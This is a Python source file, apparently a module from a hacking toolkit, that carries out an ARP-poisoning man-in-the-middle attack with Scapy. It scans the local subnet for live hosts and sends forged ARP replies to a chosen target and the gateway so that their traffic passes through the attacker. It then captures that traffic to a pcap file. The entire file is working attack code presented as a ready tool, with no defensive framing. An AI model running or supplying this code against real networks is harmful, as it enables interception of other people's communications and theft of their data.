#!/bin/bash/pythonii

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import threading
import sys
import re
import signal
import os
import subprocess
from subprocess import Popen, PIPE
from Queue import Queue
from threading import Thread

date = Popen('date +"%m-%d-%y"', shell = True, stdout = PIPE).stdout.read().split('\n')[0]
c_time = Popen("date | awk '{print $4}'", shell = True, stdout = PIPE).stdout.read().split('\n')[0]

os.system('clear')
print ("\n\n\n\033[36m\033[1m            ARP-POISONING\033[0;0m\n")

try:
    sys.stdout.write("            [*]\033[94m Internet Connection Status       \033[0;0m                           :")
    sys.stdout.flush()
    if socket.gethostbyname('www.google.com'):
        sys.stdout.write("\033[92m     CONNECTED\033[0;0m\n")

except:
    sys.stdout.write("\033[91m    NOT CONNECTED\033[0;0m\n")
    sys.stdout.write("            [-] Please Check Your Internet Connection!\n")
    
    try:
	i = input('            Press ENTER To Get Back To Main Menu!')
    except:
	os.kill(os.getpid(), signal.SIGKILL)


class Poison():

    def __init__(self):
        self.i = 0
        self.poison = 0
        self.counter=0.0
        pass

    def conn_try(self):
        try:
            print "            [*] \033[94mTrying To Re-Connect...\033[0;0m"
                
            if socket.gethostbyname('www.google.com'):
                sys.stdout.write("            [*]\033[94m Internet Connection Status       \033[0;0m                          :")
                sys.stdout.flush()
                sys.stdout.write("\033[92m                 CONNECTED\033[0;0m\n")
                obj.Options()
        except:
            print "\033[91m            [X]\033[0;0m Check Internet Connection!\n"
            os.kill(os.getpid(), signal.SIGKILL)


    def ip_validation(self):
        try:
            self.target_ip = raw_input("\n            ENTER TARGET IP: ")
            self.packet_count = float(input('            Enter Number Of Packets To Capture: '))
        except:
            print ("\n            [-]\033[91m Wrong Input, Please Try Again!\033[0;0m")
            obj.ip_validation()

        os.system('clear')
        print ("\n\n\n\033[36m\033[1m            ARP-POISONING\033[0;0m\n")
        
        try:
            sys.stdout.write("            [*]\033[94m Internet Connection Status       \033[0;0m                          :")
            sys.stdout.flush()
            if socket.gethostbyname('www.google.com'):
                sys.stdout.write("\033[92m     CONNECTED\033[0;0m\n")

        except:
            sys.stdout.write("\033[91m    NOT CONNECTED\033[0;0m\n")
            obj.conn_try()

        sys.stdout.write ('\n            [*]\033[94m Validating IP Address...\033[0;0m                                   :')
        sys.stdout.flush()
        time.sleep(2)
        if re.match('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}',self.target_ip):
            sys.stdout.write ('     DONE\n\n')
            print ("            [*] Getting Information...")
            time.sleep(1)
            obj.get_info()

        else:
            print ("\033[1m\033[91m            INVALID IP!\033[0;0m Enter Target IP Again!")
            obj.ip_validation()

    def get_info(self):

        sys.stdout.write('            [*] \033[94mGetting Target MAC Address...\033[0;0m                              :')
        sys.stdout.flush()
        time.sleep(1)
        try:
            responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=self.target_ip),verbose=False, timeout=2,retry=10)
            if responses:
                sys.stdout.write("     DONE")
                for s,r in responses:
                    self.target_mac = r[Ether].src
                                
                    sys.stdout.write ('\n            [*]\033[94m Getting Gateway IP Address... \033[0;0m                             :')
                    sys.stdout.flush()
                    time.sleep(1.5)
                    command = ["route -n | grep 'UG' | awk '{print $2}'"]
                    g=subprocess.Popen(command, stdout=PIPE,shell= True)
                    gate_ip = g.stdout.read()
                    self.gateway_ip = str(gate_ip).split("\n")[0]
                    sys.stdout.write("     DONE")

                    sys.stdout.write ("\n            [*]\033[94m Getting Gateway MAC Address...\033[0;0m                             :")
                    sys.stdout.flush()
                    time.sleep(1)

                    response,unanswer = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=self.gateway_ip),verbose=False, timeout=2,retry=10)
                    if response:
                        sys.stdout.write("     DONE")
                        for send, recv in response:
                            self.gateway_mac = recv[Ether].src
                            print ("\n            [+]\033[92m SUCCESS: Information Gathered Successfully!\033[0;0m\n")
                            print ("\033[1m            Target IP            Target MAC               Gateway IP             Gateway MAC\033[0;0m")
                            print "           ",self.target_ip,"       ",self.target_mac,"      ",self.gateway_ip,"           ",self.gateway_mac,"\n"
                    else:
                        sys.stdout.write("     FAILED")
                        sys.stdout.write("    :: [-]\033[91m ERROR\033[0;0m Retrieving Gateway MAC! Please Try Again!\n")
			try:
			    i = input('\n            Press ENTER To Get Back To Main Menu!')
			except:
       			    os.kill(os.getpid(), signal.SIGKILL)
            else:
                sys.stdout.write("     FAILED")
                sys.stdout.write ("    :: [-]\033[91m ERROR\033[0;0m Retrieving Target MAC! Check IP!\n")
		try:
		    i = input("\n            Press ENTER To Get Back To Main Menu!")
		except:
                    os.kill(os.getpid(), signal.SIGKILL)

        except:
            sys.stdout.write("\n            [-]\033[91m ERROR\033[0;0m Retrieving Information, Please Try Again!\n")
            try:
		i = input("\n            Press ENTER To Get Back To Main Menu!")
	    except:
		os.kill(os.getpid(), signal.SIGKILL)

        obj.poison_thread()   

    def online_hosts(self):
        host = subprocess.Popen('hostname -I', shell = True, stdout = PIPE)
        host_ip = host.stdout.read()

        try:
            sys.stdout.write("            [*]\033[94m Internet Connection Status       \033[0;0m                          :")
            sys.stdout.flush()
            if socket.gethostbyname('www.google.com'):
                sys.stdout.write("\033[92m    CONNECTED\033[0;0m :: "+str(host_ip)+"\n")
                                                                 
                print ("\n\033[1m            \033[4mONLINE HOSTS\033[0;0m\n")
                def get_hosts(q):        
                    while True:
                        try:
                            ip = q.get()
                            comm = ['ping -c 1 -W 2 '+ip+" | grep '64 bytes from' | awk '{print $4}'"]
                            add = subprocess.Popen(comm , shell = True, stdout = PIPE)
                            address = add.stdout.read()
                            time.sleep(.1)
                            sys.stdout.write("            "+str(re.match('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}',address).group())+'\n')
                            data.write(str(address))
                            q.task_done()

                        except:
                            q.task_done()
                            pass
        
                q = Queue(maxsize = 0)
                threads = 100

                for ip_s in range (1,255):
                    com = ["route -n | grep 'UG' | awk '{print $2}'"]
                    ga=subprocess.Popen(com, stdout=PIPE,shell= True)
                    gate_ip = ga.stdout.read()

                    ipaddr = ".".join(str(gate_ip).split(".")[0:3])+'.'+str(ip_s)
                    q.put(ipaddr)

                for i in range(threads):
                    thread = Thread(target=get_hosts, args=(q,))
                    thread.setDaemon(True)
                    thread.start()

                q.join()
                obj.Options()

        except:
            obj.conn_try()

    def poison_thread(self):

        def poison():
            self.poison+=1
            try:
                os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
            except:
                pass
            time.sleep(1)
            target_poison = ARP()
            target_poison.op = 2
            target_poison.psrc = self.gateway_ip
            target_poison.pdst = self.target_ip
            target_poison.hwdst = self.target_mac

            gateway_poison = ARP()
            gateway_poison.op = 2
            gateway_poison.psrc = self.target_ip
            gateway_poison.pdst = self.gateway_ip
            gateway_poison.hwdst = self.gateway_mac


            while True:
                try:
                    if self.poison == 2:
                        break

                    send((target_poison), verbose = False, count = 5)
                    send((gateway_poison), verbose = False, count = 5)
                    time.sleep(.75)

                except:
                    print ("            [!]\033[91m ARP-Poisoning Interrupted!\033[0;0m")
                    time.sleep(1)
		    break

        def capture_packets():

            def calc(pkt):

                self.counter+=1
                percent = (self.counter/self.packet_count)*100
                sys.stdout.write("\r            [*]\033[94m Packet Capture Started...\033[0;0m                                  :     Captured: "+str(float("%.2f"%percent))+'% ['+str(int(self.counter))+'/'+str(int(self.packet_count))+']')
                sys.stdout.flush()

            command1 = ["route -n | grep 'UG' | awk '{print $8}'"]
            i = subprocess.Popen(command1, stdout = PIPE, shell =True)
            iface1 = i.stdout.read()

            interface = str(iface1).split("\n")[0]
            conf.iface = interface
            conf.verb = 0
            print ("            [*] ARP-Poisoning Started...                                         [\033[92mPress\033[0;0m\033[91m CTRL+C\033[0;0m\033[92m To Restore Targets And Exit\033[0;0m]\n")
            time.sleep(2)
            p_thread = Thread(target = poison)
            p_thread.start()
            
            try:
                print ('            [*] \033[94mStarting Packet Sniffer... \033[0;0m                                :     Interface [\033[91m'+str(interface)+'\033[0;0m]')
                bpf_filter = "ip host %s" % self.target_ip
                packets = sniff(count=int(self.packet_count), filter=bpf_filter, iface = interface, prn = calc)
                os.chdir('bin/data/'+str(date)+'/arp_psn')
		wrpcap(str(self.target_ip)+'.pcap',packets)
                print ("\n            [+]\033[92m SUCCESS: Packets Captured!\033[0;0m                                 :     Captured ["+str(len(packets))+'/'+str(int(self.packet_count))+'] Packets')
                print ("\n            [$] Captured Packets Saved                                     :     File: \033[91m"+str(self.target_ip)+'.pcap\033[0;0m')
                time.sleep(2)
                self.poison+=1
		obj.restore_targets()

	    except KeyboardInterrupt:
		self.poison+=1
                sys.stdout.write("\n            [-]\033[91m ERROR\033[0;0m Capturing Packets                                    :")
                sys.stdout.write("     INTERRUPT")
                time.sleep(1)
                obj.restore_targets()

            except:
		self.poison+=1
                sys.stdout.write("\n            [-]\033[91m ERROR\033[0;0m Capturing Packets                                    :")
                sys.stdout.write("     FAILED")
                time.sleep(1)
                obj.restore_targets()
            
        capture_packets()


    def restore_targets(self):
        sys.stdout.write("\n            [*]\033[94m Restoring Targets...                                       \033[0;0m:")
        sys.stdout.write("     INITIATED\n")
        time.sleep(2)
        try:
            try:            
                os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
            except:
                pass

            send(ARP(op=2, psrc = self.gateway_ip, pdst = self.target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = self.gateway_mac), count = 5)
            send(ARP(op=2, psrc = self.target_ip, pdst = self.gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = self.target_mac), count = 5)
            print ("            [+]\033[92m SUCCESS: Targets Restored!\033[0;0m\n")

        except:
            try:            
                os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
            except:
                pass

            sys.stdout.write("\n            [-]\033[91m ERROR\033[0;0m Restoring Targets!")
	    try:            
                i = input('            Press ENTER To Get Back To Main Menu!')
            except:
                os.kill(os.getpid(), signal.SIGKILL)
            
    def Options(self):

        print ("\n\033[1m\033[95m            Enter Choice:\033[0;0m\n\n            1) List Online Hosts\n            2) Continue With ARP-Poison\033[0;0m \033[92m(Already Have Target IP)\033[0;0m\n\033[1m            3)\033[91m EXIT\033[0;0m\n")
        try:        
            inp = int(raw_input("\033[1m            Choice> \033[0;0m"))
            if not inp:
                raise ValueError('empty string')
            else:
                if inp == 1:
                    os.system('clear')
                    print ("\n\n\n\033[36m\033[1m            ARP-POISONING\033[0;0m\n")
                    obj.online_hosts()
                elif inp == 2:
                    obj.ip_validation()
                elif inp == 3:
                    print ("\n            [X]\033[91m Exiting\033[0;0m Back To The Main Menu...\033[0;0m\n")
                    time.sleep(2)
                    os.system('clear; python main/MainWindow.py')
                    
                else:
                    print ("\033[91m            INVALID\033[0;0m Input, Try Again!")
                    obj.Options()

        except ValueError:
            print '\n'
            os.system('clear')
            print ("\033[91m            INVALID\033[0;0m Input, Try Again!")
            obj.Options()

obj = Poison()
obj.Options()
